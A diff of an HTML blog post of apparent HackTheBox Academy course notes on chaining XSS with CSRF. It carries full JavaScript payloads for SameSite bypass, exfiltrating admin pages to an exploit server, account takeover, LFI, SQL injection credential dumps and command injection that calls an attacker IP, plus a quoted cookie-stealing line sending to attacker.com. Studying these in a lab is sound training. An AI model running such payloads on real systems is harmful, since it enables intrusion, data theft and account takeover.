+<p>If we analyze the CSRF tokens more closely, we can see that the CSRF token is simply the current time as a Unix timestamp. This makes CSRF tokens predictable and allows us to create viable vulnerabilities to perform CSRF attacks. To do this, we must correctly guess the victim's CSRF token, which was the victim's last access before accessing our payload <code>/profile.php</code> The time of the endpoint. Since the default SameSite <code>Lax</code> Due to the limitations of the policy, we cannot use JavaScript code to dynamically brute force the CSRF token, so it is difficult to accurately grasp the timing. Therefore, we need to hardcode the guessed CSRF tokens in the HTML form and update the value for each guess:</p>
 <pre><code class="language-html">&lt;html&gt;
   &lt;body&gt;
     &lt;form method="GET" action="https://vulnerablesite.htb/profile.php"&gt;
@@ -1221,8 +1221,8 @@ Found: guestbook.vulnerablesite.htb (Status: 200) [Size: 2317]
 <pre><code>https://misc-csrf.htb/login.php  
 user: htb-stdnt  
 pass: Academy_student!</code></pre>
-<ol><li>The bypass point for this question is not to type directly across sites.<code>/profile.php</code>, but use<strong>client redirect</strong> bypass<code>SameSite=Strict</code>. The idea given in the course materials is: let the victim first access a<strong>client redirect</strong>endpoint and put<code>promote=htb-stdnt</code> Inject it into the final redirected URL, so that subsequent requests will be treated as SameSite, and the administrator cookie will be included in the request to complete CSRF.</li></ol>
-<ol><li>in the exploit server<code>/exploit</code> Save this payload in:</li></ol>
+<ol><li>The bypass point for this question is not to type directly across sites.<code>/profile.php</code>, but use<strong>client redirect</strong> bypass <code>SameSite=Strict</code>. The idea given in the course materials is: let the victim first access a<strong>client redirect</strong>endpoint and put <code>promote=htb-stdnt</code> Inject it into the final redirected URL, so that subsequent requests will be treated as SameSite, and the administrator cookie will be included in the request to complete CSRF.</li></ol>
+<ol><li>in the exploit server <code>/exploit</code> Save this payload in:</li></ol>
 <pre><code>&lt;script&gt;  
 document.location = "https://misc-csrf.htb/admin.php?user=htb-stdnt%26promote=htb-stdnt";  
 &lt;/script&gt;</code></pre>
@@ -1230,25 +1230,25 @@ document.location = "https://misc-csrf.htb/admin.php?user=htb-stdnt%26promote=ht
 <pre><code>https://exploitserver.htb/deliver</code></pre>
 <p>Select target:</p>
 <pre><code>misc-csrf.htb</code></pre>
-<p>point<code>Deliver</code>.</p>
+<p>point <code>Deliver</code>.</p>
 <ol><li>Wait a few seconds and then reply:</li></ol>
 <pre><code>https://misc-csrf.htb/profile.php</code></pre>
 <p>The permissions have been changed to admin.</p>
 <h2>XSS exploit</h2>
 <p>We can exploit a cross-site scripting (XSS) vulnerability to make an HTTP request, obtain its response, and exfiltrate data to a server we control. Therefore, we can carefully construct an XSS payload, initiate a cross-domain request, and combine XSS with a CSRF payload to implement an attack technique that poses a threat to the victim's internal network.</p>
-<p>Additionally, web browsers often enforce the SameSite policy for cookies if the SameSite attribute is not explicitly set, which<code>Lax</code>Greatly limits the possibility of CSRF attacks. Therefore, combining XSS and CSRF is a powerful attack technique.</p>
-<p><strong>HttpOnly Cookie flag</strong> Stealing a victim's session cookie is the most widely used method by threat actors to exploit XSS vulnerabilities. However, by using session cookies on<code>HttpOnly</code> properties that prevent this technique. This attribute prevents JavaScript code from accessing the cookie. More specifically, if we access<code>document.cookie</code>, with<code>HttpOnly</code> The attribute's cookie will not exist, which actually prevents the victim's session cookie from being stolen. However, this does not necessarily lessen the severity of an XSS vulnerability. Since XSS allows us to execute arbitrary JavaScript code within the vulnerable web application in the victim's browser, and within the context of the victim, we can perform the same actions as if we knew the session cookie. However, instead of manually setting the victim session cookie in the browser, we need to write an XSS payload that performs the action on our behalf.</p>
+<p>Additionally, web browsers often enforce the SameSite policy for cookies if the SameSite attribute is not explicitly set, which <code>Lax</code> Greatly limits the possibility of CSRF attacks. Therefore, combining XSS and CSRF is a powerful attack technique.</p>
+<p><strong>HttpOnly Cookie flag</strong> Stealing a victim's session cookie is the most widely used method by threat actors to exploit XSS vulnerabilities. However, by using session cookies on <code>HttpOnly</code> properties that prevent this technique. This attribute prevents JavaScript code from accessing the cookie. More specifically, if we access <code>document.cookie</code>, with <code>HttpOnly</code> The attribute's cookie will not exist, which actually prevents the victim's session cookie from being stolen. However, this does not necessarily lessen the severity of an XSS vulnerability. Since XSS allows us to execute arbitrary JavaScript code within the vulnerable web application in the victim's browser, and within the context of the victim, we can perform the same actions as if we knew the session cookie. However, instead of manually setting the victim session cookie in the browser, we need to write an XSS payload that performs the action on our behalf.</p>
 <p><strong>Exfiltrating Data with XSS</strong></p>
 <p>The payload of an XSS attack is executed in the victim's browser or user environment, allowing the attacker to obtain data accessed from the victim's perspective. A low-privilege attacker can exploit XSS vulnerabilities to gain administrative access to the victim application, provided that the victim has administrative rights. We can exploit this to steal arbitrary data from the web application.</p>
 <p>In order to access information in the victim context and exfiltrate the information to our exfiltration server, we can use<a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest" rel="noreferrer" target="_blank">XMLHttpRequest</a> Object, which allows us to send HTTP requests and interact with responses.</p>
-<p>Our sample web app is the same guestbook app we've seen before. The same XSS vulnerability still exists. But this time, the session cookie is set<code>HttpOnly</code> Flags to prevent us from stealing:</p>
+<p>Our sample web app is the same guestbook app we've seen before. The same XSS vulnerability still exists. But this time, the session cookie is set <code>HttpOnly</code> Flags to prevent us from stealing:</p>
 <img alt="Pasted image 20260418042747" src="assets/posts/advanced-xss-csrf/Pasted image 20260418042747.png"/>
-<blockquote>set<code>HttpOnly</code>Cookies cannot be<code>document.cookie</code>Read, cannot be accessed by any front-end JS.</blockquote>
+<blockquote>set <code>HttpOnly</code> Cookies cannot be <code>document.cookie</code> Read, cannot be accessed by any front-end JS.</blockquote>
 <blockquote>For example, a common stealing method is XSS,<code>new Image().src="http://attacker.com/?c="+document.cookie</code></blockquote>
-<blockquote><code>HttpOnly</code>What is blocked is the reading path from the browser script to the cookie.</blockquote>
+<blockquote><code>HttpOnly</code> What is blocked is the reading path from the browser script to the cookie.</blockquote>
 <p>Assuming the victim is an administrator, we should look at the web application from their perspective to determine if there are any features that are only visible to administrators. To do this, let’s access a known endpoint in the victim context and respond to our divestment server. To do this, we can create an entry in the guestbook containing the following XSS payload:</p>
 <pre><code>&lt;script src="https://exploitserver.htb/exploit"&gt;&lt;/script&gt;</code></pre>
-<p>We can then exploit the server to write an XSS payload. We will use a simple payload, access<code>/home.php</code> endpoint and export the base64-encoded response to the stealing server:</p>
+<p>We can then exploit the server to write an XSS payload. We will use a simple payload, access <code>/home.php</code> endpoint and export the base64-encoded response to the stealing server:</p>
 <pre><code class="language-js">var xhr = new XMLHttpRequest();
 xhr.open('GET', '/home.php', true);
 xhr.withCredentials = true;
@@ -1266,7 +1266,7 @@ Serving HTTPS on 0.0.0.0 port 4443 (https://0.0.0.0:4443/)...
 10.129.136.40 - - [30/Nov/2025 12:36:37] "OPTIONS /log HTTP/1.1" 200 -
 10.129.136.40 - - [30/Nov/2025 12:36:37] [i] POST body: {"data":"CjwhRE&lt;SNIP&gt;Ww+"}
 10.129.136.40 - - [30/Nov/2025 12:36:37] "POST /log HTTP/1.1" 200 -</code></pre>
-<p>After decoding the response, we can analyze whether it is related to a low-privileged user in<code>/home.php</code> There are differences in what the endpoints access. We can find that in the navigation section of the reply, /<code>admin.php</code> There is a reference to the admin dashboard, but not in the context of our user:</p>
+<p>After decoding the response, we can analyze whether it is related to a low-privileged user in <code>/home.php</code> There are differences in what the endpoints access. We can find that in the navigation section of the reply, /<code>admin.php</code> There is a reference to the admin dashboard, but not in the context of our user:</p>
 <img alt="Pasted image 20260418043458" src="assets/posts/advanced-xss-csrf/Pasted image 20260418043458.png"/>
 <p>Let's adjust the load on the vulnerable server to /<code>admin.php</code> The endpoint instead steals, thereby stealing the administrator dashboard, including any potentially sensitive data:</p>
 <pre><code class="language-js">var xhr = new XMLHttpRequest();
@@ -1298,7 +1298,7 @@ xhr.onload = () =&gt; {
 };
 xhr.send();</code></pre>
 <p><code>exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));</code></p>
-<ul><li><code>xhr.responseTest</code>: indicates the previous one<code>xhr</code>The response body obtained by the request, which is the html content returned by admin.php</li><li><code>btoa()</code>: perform base64 encoding</li><li><code>JSON.stringify(...)</code>: Convert the above JS object into a JSON string. For example it becomes:<code>{"data":"QWxhZGRpbjpvcGVuIHNlc2FtZQ=="}</code></li><li><code>exfil.send(...)</code>: Execute send command</li></ul>
+<ul><li><code>xhr.responseTest</code>: indicates the previous one <code>xhr</code> The response body obtained by the request, which is the html content returned by admin.php</li><li><code>btoa()</code>: perform base64 encoding</li><li><code>JSON.stringify(...)</code>: Convert the above JS object into a JSON string. For example it becomes:<code>{"data":"QWxhZGRpbjpvcGVuIHNlc2FtZQ=="}</code></li><li><code>exfil.send(...)</code>: Execute send command</li></ul>
 <h2>Attack from victim session</h2>
 <p>After discussing how to steal data from the victim user context with an XSS vulnerability, we'll look at how to trigger actions that may change state. Since XSS gives us complete control over the victim's session, we can trigger any functionality implemented by the web application in the context of the victim user. This could lead to a complete takeover of the victim's account, or facilitate further attacks.</p>
 <p><strong>Account takeover</strong> This time, our sample web application includes the ability to update user profiles, including user passwords:</p>
@@ -1308,7 +1308,7 @@ xhr.send();</code></pre>
 <p>Since updating an account password does not require the old password, we can exploit a known XSS vulnerability to change the victim's password. This allowed us to log into the victim's account, allowing us to completely take over their account. The form is secured with a CSRF_token, but due to an XSS vulnerability we can read the CSRF token and add it to the request.</p>
 <p>To do this, we use the same XSS vulnerability used in the previous chapter to load JavaScript code from the vulnerable server:</p>
 <pre><code class="language-html">&lt;script src="https://exploitserver.htb/exploit"&gt;&lt;/script&gt;</code></pre>
-<p>After that, we can<code>/home.php</code> Send a GET request to obtain a valid CSRF token, extract it, and then make a POST request to change the victim's password to<code>pwned</code>.</p>
+<p>After that, we can <code>/home.php</code> Send a GET request to obtain a valid CSRF token, extract it, and then make a POST request to change the victim's password to <code>pwned</code>.</p>
 <pre><code class="language-js">// GET CSRF token
 var xhr = new XMLHttpRequest();
 xhr.open('GET', '/home.php', false);
@@ -1324,12 +1324,12 @@ csrf_req.open('POST', '/home.php', false);
 csrf_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
 csrf_req.withCredentials = true;
 csrf_req.send(params);</code></pre>
-<p>After waiting for the admin user to trigger XSS, we can use<code>admin:pwned</code> credentials to log into the victim's account.</p>
+<p>After waiting for the admin user to trigger XSS, we can use <code>admin:pwned</code> credentials to log into the victim's account.</p>
 <p><strong>Chaining Vulnerabilities</strong> As mentioned above, we can exploit XSS vulnerabilities to trigger any functionality in a web application from the victim's user context. We can go a step further and chain multiple vulnerabilities together by exploiting different vulnerabilities on endpoints in the web application that only the victim has access to.</p>
 <p>To do this, we first need to analyze the web application from the victim's perspective, identify endpoints that the victim has access to but not our own account, and finally, any vulnerabilities discovered through our XSS load tests and exploits.</p>
 <p>We'll again use the same base XSS payload that exploits a custom exploit on the server:</p>
 <pre><code>&lt;script src="https://exploitserver.htb/exploit"&gt;&lt;/script&gt;</code></pre>
-<p>Steal from the victim's user context<code>/home.php</code> endpoint will expose endpoint/<code>admin.php</code>, which our users cannot access:</p>
+<p>Steal from the victim's user context <code>/home.php</code> endpoint will expose endpoint/<code>admin.php</code>, which our users cannot access:</p>
 <img alt="Pasted image 20260418153117" src="assets/posts/advanced-xss-csrf/Pasted image 20260418153117.png"/>
 <p>To identify the data displayed by the admin endpoint, we can export the response using the same payload used in the previous section:</p>
 <pre><code class="language-js">var xhr = new XMLHttpRequest();
@@ -1344,7 +1344,7 @@ xhr.onload = () =&gt; {
 xhr.send();</code></pre>
 <p>This reveals the following HTML response:</p>
 <img alt="Pasted image 20260418153143" src="assets/posts/advanced-xss-csrf/Pasted image 20260418153143.png"/>
-<p>After analyzing the HTML source code, it appears that the admin endpoint supports GET parameters<code>view</code>, can be set to different files in the current working directory. This is an obvious entry point for local file inclusion (LFI) vulnerabilities. To verify our hypothesis, let's adjust the payload to include the file<code>/etc/passwd</code>: </p>
+<p>After analyzing the HTML source code, it appears that the admin endpoint supports GET parameters <code>view</code>, can be set to different files in the current working directory. This is an obvious entry point for local file inclusion (LFI) vulnerabilities. To verify our hypothesis, let's adjust the payload to include the file <code>/etc/passwd</code>: </p>
 <pre><code class="language-js">var xhr = new XMLHttpRequest();
 xhr.open('GET', '/admin.php?view=../../../../etc/passwd', true);
 xhr.withCredentials = true;
@@ -1378,7 +1378,7 @@ xhr.send();</code></pre>
 <p>As we can see, the management endpoint loads additional information from the API<code>https://api.internal-apis.htb/</code>. However, if we try to access the API, we are blocked, indicating that the API is only accessible from the victim's local network:</p>
 <img alt="Pasted image 20260418154701" src="assets/posts/advanced-xss-csrf/Pasted image 20260418154701.png"/>
 <p>Therefore, we had to adapt the XSS payload to enumerate the API in the victim's browser.</p>
-<p><strong>Enum internal API</strong> First, let’s extract the leaked endpoint in the admin endpoint<code>/v1/sessions</code>. We can achieve this by adjusting the XSS payload accordingly:</p>
+<p><strong>Enum internal API</strong> First, let’s extract the leaked endpoint in the admin endpoint <code>/v1/sessions</code>. We can achieve this by adjusting the XSS payload accordingly:</p>
 <pre><code class="language-js">var xhr = new XMLHttpRequest();
 xhr.open('GET', 'https://api.internal-apis.htb/v1/sessions', true);
 xhr.withCredentials = true;
@@ -1390,7 +1390,7 @@ xhr.onload = () =&gt; {
 };
 xhr.send();</code></pre>
 <p>After updating the payload and waiting for a while, we did not receive any more data about the data breach server, indicating something went wrong.</p>
-<p>Since we are communicating with an API with a different origin, the Same Origin Policy prevents us from accessing the response unless the API implements the appropriate CORS headers to bypass the Same Origin Policy. Since the management endpoint gets data from the API across domains, we can assume that the API has CORS configured, allowing us to access the response. However, if we analyze more closely the client-side JavaScript code that fetches the data, we see that the call to the function<code>fetch</code>No<code>credentials: 'include'</code>Set CORS properties. On the other hand, we<code>withCredentials</code>This property is set explicitly in the payload. If the API does not pass the settings<code>Access-Control-Allow-Credentials</code>CORS header to allow this, there is no way to bypass the Same Origin Policy and a CORS error will be thrown, preventing us from accessing the response. To bypass this issue we need to match the parameters set in the leaked call<code>fetch</code>, and send the request without providing credentials:</p>
+<p>Since we are communicating with an API with a different origin, the Same Origin Policy prevents us from accessing the response unless the API implements the appropriate CORS headers to bypass the Same Origin Policy. Since the management endpoint gets data from the API across domains, we can assume that the API has CORS configured, allowing us to access the response. However, if we analyze more closely the client-side JavaScript code that fetches the data, we see that the call to the function <code>fetch</code> No <code>credentials: 'include'</code> Set CORS properties. On the other hand, we <code>withCredentials</code> This property is set explicitly in the payload. If the API does not pass the settings <code>Access-Control-Allow-Credentials</code> CORS header to allow this, there is no way to bypass the Same Origin Policy and a CORS error will be thrown, preventing us from accessing the response. To bypass this issue we need to match the parameters set in the leaked call <code>fetch</code>, and send the request without providing credentials:</p>
 <pre><code class="language-js">var xhr = new XMLHttpRequest();
 xhr.open('GET', 'https://api.internal-apis.htb/v1/sessions', true);
 xhr.onload = () =&gt; {
@@ -1400,7 +1400,7 @@ xhr.onload = () =&gt; {
     exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
 };
 xhr.send();</code></pre>
-<p>This indicates that we need to exactly match the configuration expected by the internal API to avoid CORS issues. Since we do not have direct access to the API, we cannot analyze the CORS configuration by identifying the CORS headers set in the response. We need to copy the configuration from the leaked HTML code, which implements communication with the internal API. CORS errors prevent subsequent statements from executing. Therefore, it is recommended to use a<code>try-catch</code>code block to identify the correct CORS configuration to export the response, making it easier to debug the payload (note that<code>async</code>Parameters in the call<code>xhr.open</code>set to<code>false</code>): </p>
+<p>This indicates that we need to exactly match the configuration expected by the internal API to avoid CORS issues. Since we do not have direct access to the API, we cannot analyze the CORS configuration by identifying the CORS headers set in the response. We need to copy the configuration from the leaked HTML code, which implements communication with the internal API. CORS errors prevent subsequent statements from executing. Therefore, it is recommended to use a <code>try-catch</code> code block to identify the correct CORS configuration to export the response, making it easier to debug the payload (note that <code>async</code> Parameters in the call <code>xhr.open</code> set to <code>false</code>): </p>
 <pre><code class="language-js">try {
     var xhr = new XMLHttpRequest();
     xhr.open('GET', 'https://api.internal-apis.htb/v1/sessions', false);
@@ -1417,7 +1417,7 @@ exfil.setRequestHeader("Content-Type", "application/json");
 exfil.send(JSON.stringify({data: btoa(msg)}));</code></pre>
 <p>This will cause the following information to be leaked, indicating that there is a problem with our HTTP request, allowing us to adjust the configuration of the request to match the CORS configuration:</p>
 <pre><code class="language-txt">NetworkError: Failed to execute 'send' on 'XMLHttpRequest': Failed to load 'https://api.internal-apis.htb/v1/sessions'.</code></pre>
-<p>Additionally, internal APIs may require authentication using an authentication holder instead of a cookie. we can use<a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage" rel="noreferrer" target="_blank">localStorage</a>The attribute accesses the authentication holder stored in the victim's local storage (in the context of the vulnerable web application). Then we can use<a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/setRequestHeader" rel="noreferrer" target="_blank">setRequestHeader</a><code>Authorization</code>Function sets request headers.<code>XMLHttpRequest</code></p>
+<p>Additionally, internal APIs may require authentication using an authentication holder instead of a cookie. we can use<a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage" rel="noreferrer" target="_blank">localStorage</a>The attribute accesses the authentication holder stored in the victim's local storage (in the context of the vulnerable web application). Then we can use<a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/setRequestHeader" rel="noreferrer" target="_blank">setRequestHeader</a><code>Authorization</code> Function sets request headers.<code>XMLHttpRequest</code></p>
 <blockquote><strong>Note:</strong> If you don't receive the expected data, keep in mind that there may be a problem with the CORS configuration or missing authentication.</blockquote>
 <p>With appropriate modifications to avoid CORS errors, we receive the data from the compromised server, which we can then decode:</p>
 <pre><code class="language-shell">Chenduoduo@htb[/htb]$ echo -n eyJzZXNzaW9ucyI6W3siYWdlbnQiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTA5LjAuNTQxNC4xMjAgU2FmYXJpLzUzNy4zNiIsInRpbWUiOiIxNjkxNjQ1NzMxIiwidXNlciI6ImFkbWluIn0seyJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMDkuMC41NDE0LjEyMCBTYWZhcmkvNTM3LjM2IiwidGltZSI6IjE2OTI1OTYxMzEiLCJ1c2VyIjoiYWRtaW4ifSx7ImFnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwOS4wLjU0MTQuMTIwIFNhZmFyaS81MzcuMzYiLCJ0aW1lIjoiMTY5MzIwMDkzMSIsInVzZXIiOiJhZG1pbiJ9XX0K | base64 -d | jq
@@ -1441,7 +1441,7 @@ exfil.send(JSON.stringify({data: btoa(msg)}));</code></pre>
     }
   ]
 }</code></pre>
-<p>Since the data does not contain any valuable information, we further enumerate the API to identify additional endpoints. We can identify additional endpoints by implementing directory brute force in the XSS payload, which leaks all existing endpoints to the compromised server. we will base on<a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/api/objects-lowercase.txt" rel="noreferrer" target="_blank">objects-lowercase.txt</a>Dictionary for proof of concept<code>SecLists</code>. The payload will send a request to each endpoint and then determine if the endpoint is valid by checking the status code. We can achieve this using a payload similar to the following:</p>
+<p>Since the data does not contain any valuable information, we further enumerate the API to identify additional endpoints. We can identify additional endpoints by implementing directory brute force in the XSS payload, which leaks all existing endpoints to the compromised server. we will base on<a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/api/objects-lowercase.txt" rel="noreferrer" target="_blank">objects-lowercase.txt</a>Dictionary for proof of concept <code>SecLists</code>. The payload will send a request to each endpoint and then determine if the endpoint is valid by checking the status code. We can achieve this using a payload similar to the following:</p>
 <pre><code class="language-js">var endpoints = ['access-token','account','accounts','amount','balance','balances','bar','baz','bio','bios','category','channel','chart','circular','company','content','contract','coordinate','credentials','creds','custom','customer','customers','details','dir','directory','dob','email','employee','event','favorite','feed','foo','form','github','gmail','group','history','image','info','item','job','link','links','location','log','login','logins','logs','map','member','members','messages','money','my','name','names','news','option','options','pass','password','passwords','phone','picture','pin','post','prod','production','profile','profiles','publication','record','sale','sales','set','setting','settings','setup','site','test','theme','token','tokens','twitter','union','url','user','username','users','vendor','vendors','version','website','work','yahoo'];
 
 for (i in endpoints){
@@ -1478,7 +1478,7 @@ xhr.onload = () =&gt; {
 xhr.send();</code></pre>
 <h2>Leveraging internal web applications (1)</h2>
 <p><strong>Identify vulnerabilities</strong></p>
-<p>We will use the same XSS attack payload from the previous sections and<code>/admin.php</code>Endpoint data exfiltration begins. We will omit this part here since we have already discussed the corresponding attack payloads in previous sections. When a victim triggers an XSS vulnerability, the response is exfiltrated to the compromised server. We can see that the management endpoint contains a reference to the internal web application<code>https://internal.internal-webapps-1.htb</code>: </p>
+<p>We will use the same XSS attack payload from the previous sections and <code>/admin.php</code> Endpoint data exfiltration begins. We will omit this part here since we have already discussed the corresponding attack payloads in previous sections. When a victim triggers an XSS vulnerability, the response is exfiltrated to the compromised server. We can see that the management endpoint contains a reference to the internal web application <code>https://internal.internal-webapps-1.htb</code>: </p>
 <img alt="Pasted image 20260418161718" src="assets/posts/advanced-xss-csrf/Pasted image 20260418161718.png"/>
 <p>If we try to access the page directly, we are blocked:</p>
 <img alt="Pasted image 20260418161726" src="assets/posts/advanced-xss-csrf/Pasted image 20260418161726.png"/>
@@ -1509,7 +1509,7 @@ xhr.send(params);</code></pre>
 <p>This resulted in the following response, confirming a SQL injection vulnerability in the internal web application:</p>
 <pre><code class="language-html">HTTP 500 - SQL Error</code></pre>
 <p><strong>Exploit vulnerabilities</strong> We will exploit a SQL injection vulnerability to bypass the login and extract the contents of the database.</p>
-<p>We will first bypass authentication, this can be achieved by username<code>' OR '1'='1'-- -</code>: </p>
+<p>We will first bypass authentication, this can be achieved by username <code>' OR '1'='1'-- -</code>: </p>
 <pre><code class="language-js">var xhr = new XMLHttpRequest();
 var params = \`uname=\${encodeURIComponent("' OR '1'='1' -- -")}&amp;pass=x\`;
 xhr.open('POST', 'https://internal.internal-webapps-1.htb/check', false);
@@ -1523,7 +1523,7 @@ xhr.onload = () =&gt; {
 xhr.send(params);</code></pre>
 <p>After logging in, the following information will be displayed on the screen:</p>
 <pre><code>(1, 'admin', 'InternalAdmin2023!', 'This is the default admin account.')</code></pre>
-<p>The data appears to include usernames, passwords and account descriptions. Let's confirm this by exporting the entire users table. We can detect database systems just like we detect other SQL injection vulnerabilities by enumerating common payloads. In this case we are dealing with a<code>SQLite</code>database. Since there appear to be four columns in the output, we can export all tables using the following payload:</p>
+<p>The data appears to include usernames, passwords and account descriptions. Let's confirm this by exporting the entire users table. We can detect database systems just like we detect other SQL injection vulnerabilities by enumerating common payloads. In this case we are dealing with a <code>SQLite</code> database. Since there appear to be four columns in the output, we can export all tables using the following payload:</p>
 <pre><code class="language-js">var xhr = new XMLHttpRequest();
 var params = \`uname=\${encodeURIComponent("' UNION SELECT 1,2,3,group_concat(tbl_name) FROM sqlite_master-- -")}&amp;pass=x\`;
 xhr.open('POST', 'https://internal.internal-webapps-1.htb/check', false);
@@ -1535,7 +1535,7 @@ xhr.onload = () =&gt; {
     exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
 };
 xhr.send(params);</code></pre>
-<p>We can then export the table's schema<code>users</code>: </p>
+<p>We can then export the table's schema <code>users</code>: </p>
 <pre><code class="language-js">var xhr = new XMLHttpRequest();
 var params = \`uname=\${encodeURIComponent("' UNION SELECT 1,2,3,group_concat(sql) FROM sqlite_master WHERE name='users'-- -")}&amp;pass=x\`;
 xhr.open('POST', 'https://internal.internal-webapps-1.htb/check', false);
@@ -1578,7 +1578,7 @@ xhr.onload = () =&gt; {
     exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
 };
 xhr.send(params);</code></pre>
-<p><code>secretdata</code> Internal and external<code>data</code> and<code>id</code>.</p>
+<p><code>secretdata</code> Internal and external <code>data</code> and <code>id</code>.</p>
 <pre><code>var xhr = new XMLHttpRequest();
 var params = \`uname=\${encodeURIComponent("' UNION SELECT 1,2,3,group_concat(id||':'||data) FROM secretdata-- -")}&amp;pass=x\`;
 xhr.open('POST', 'https://internal.internal-webapps-1.htb/check', false);
@@ -1591,7 +1591,7 @@ xhr.onload = () =&gt; {
 };
 xhr.send(params);</code></pre>
 <h2>Leveraging Internal Web Applications (2)</h2>
-<p><strong>Identify vulnerabilities</strong> The identification process is essentially the same as that discussed in the previous section. We will use the same XSS base payload and the management endpoint contains a reference to another internal web application<code>https://internal.internal-webapps-2.htb</code>. We can steal the index of this internal web application using the following payload:</p>
+<p><strong>Identify vulnerabilities</strong> The identification process is essentially the same as that discussed in the previous section. We will use the same XSS base payload and the management endpoint contains a reference to another internal web application <code>https://internal.internal-webapps-2.htb</code>. We can steal the index of this internal web application using the following payload:</p>
 <pre><code class="language-js">var xhr = new XMLHttpRequest();
 xhr.open('GET', 'https://internal.internal-webapps-2.htb/', false);
 xhr.onload = () =&gt; {
@@ -1631,7 +1631,7 @@ xhr.onload = () =&gt; {
 xhr.send(params);</code></pre>
 <p>This will result in the following response:</p>
 <pre><code>curl: (6) Could not resolve host: doesnotexist.htb</code></pre>
-<p>As we can see, the status seems to be obtained by some means<code>curl</code>. Command injection vulnerabilities can exist if implemented improperly or if proper security measures are lacking. We can verify this by injecting an additional curl command into the data leak server:</p>
+<p>As we can see, the status seems to be obtained by some means <code>curl</code>. Command injection vulnerabilities can exist if implemented improperly or if proper security measures are lacking. We can verify this by injecting an additional curl command into the data leak server:</p>
 <pre><code class="language-js">var xhr = new XMLHttpRequest();
 var params = \`webapp_selector=\${encodeURIComponent("| curl -k https://10.10.15.156:4443?pwn")}\`;
 xhr.open('POST', 'https://internal.internal-webapps-2.htb/check', false);
@@ -1645,7 +1645,7 @@ xhr.onload = () =&gt; {
 xhr.send(params);</code></pre>
 <p>Afterwards, we can see the expected request on the data breach server, confirming the existence of the command injection vulnerability:</p>
 <pre><code>Chenduoduo@htb[/htb]$ python3 server.py Serving HTTPS on 0.0.0.0 port 4443 (https://0.0.0.0:4443/)... 10.129.136.40 - - [30/Nov/2025 13:31:33] "GET /?pwn HTTP/1.1" 200 - 10.129.136.40 - - [30/Nov/2025 13:31:33] "OPTIONS /log HTTP/1.1" 200 - 10.129.136.40 - - [30/Nov/2025 13:31:36] [i] POST body: {"data":"PCFET&lt;SNIP&gt;tbD4="} 10.129.136.40 - - [30/Nov/2025 13:31:36] "POST /log HTTP/1.1" 200 -</code></pre>
-<p><strong>exploit</strong> We can specify the command injection payload in the XSS attack payload and leak the results to the leak server. Therefore, this exploit is no different from other command injection vulnerabilities. For example, we can execute the following command<code>id</code>: </p>
+<p><strong>exploit</strong> We can specify the command injection payload in the XSS attack payload and leak the results to the leak server. Therefore, this exploit is no different from other command injection vulnerabilities. For example, we can execute the following command <code>id</code>: </p>
 <pre><code class="language-js">var xhr = new XMLHttpRequest();
 var params = \`webapp_selector=\${encodeURIComponent("| id")}\`;
 xhr.open('POST', 'https://internal.internal-webapps-2.htb/check', false);
@@ -1671,39 +1671,39 @@ xhr.onload = () =&gt; {
 };
 xhr.send(params);</code></pre>
 <h2>Content Security Policy (CSP)</h2>
-<p>Content Security Policy (CSP) is a defense-in-depth security measure that reduces the severity of cross-site scripting (XSS) vulnerabilities by limiting their exploitability. CSP in<code>Content-Security-Policy</code>configured in the response header.</p>
+<p>Content Security Policy (CSP) is a defense-in-depth security measure that reduces the severity of cross-site scripting (XSS) vulnerabilities by limiting their exploitability. CSP is configured in the <code>Content-Security-Policy</code> response header.</p>
 <h3>CSP basics</h3>
 <p>It consists of multiple instructions. Each directive allows one or more values. The browser enforces the CSP and blocks the resource from loading or executing based on the CSP. This section discusses some example instructions.</p>
-<p>For example, the<code>script-src</code> Directives define where JavaScript can be loaded and executed from; we can limit the domains from which JavaScript code is allowed to be loaded using the following policy:</p>
-<p>http <code>Content-Security-Policy: script-src 'self' https://benignsite.htb</code></p>
-<p>This Content Security Policy (CSP) instructs browsers to load JavaScript only from sources that have the same origin as the page itself and from external sources<code>https://benignsite.htb</code>. Therefore, if an attacker injects the following JavaScript code in an XSS payload, the victim's browser will not load the script and therefore will not execute it:</p>
-<p>html <code>&lt;script src="https://exploitserver.htb/pwn.js"&gt;&lt;/script&gt;</code></p>
+<p>For example, the <code>script-src</code> directive defines where JavaScript can be loaded and executed from; we can limit the domains from which JavaScript code is allowed to be loaded using the following policy:</p>
+<pre><code>Content-Security-Policy: script-src 'self' https://benignsite.htb</code></pre>
+<p>This Content Security Policy (CSP) instructs browsers to load JavaScript only from sources that have the same origin as the page itself and from external sources <code>https://benignsite.htb</code>. Therefore, if an attacker injects the following JavaScript code in an XSS payload, the victim's browser will not load the script and therefore will not execute it:</p>
+<pre><code>&lt;script src="https://exploitserver.htb/pwn.js"&gt;&lt;/script&gt;</code></pre>
 <p>However, the following scripts are allowed to be loaded and executed:</p>
-<p>html <code>&lt;script src="/js/useful.js"&gt;&lt;/script&gt; &lt;script src="https://benignsite.htb/main.js"&gt;&lt;/script&gt;</code></p>
-<p>In addition, due to<code>unsafe-inline</code>If this value is not specified, it blocks all inline scripts. As a result, the following potential XSS payloads are blocked and will not execute:</p>
-<p>html <code>&lt;script&gt;alert(1)&lt;/script&gt; &lt;img src=x onerror=alert(1) /&gt; &lt;a href="javascript:alert(1)"&gt;click&lt;/a&gt;</code></p>
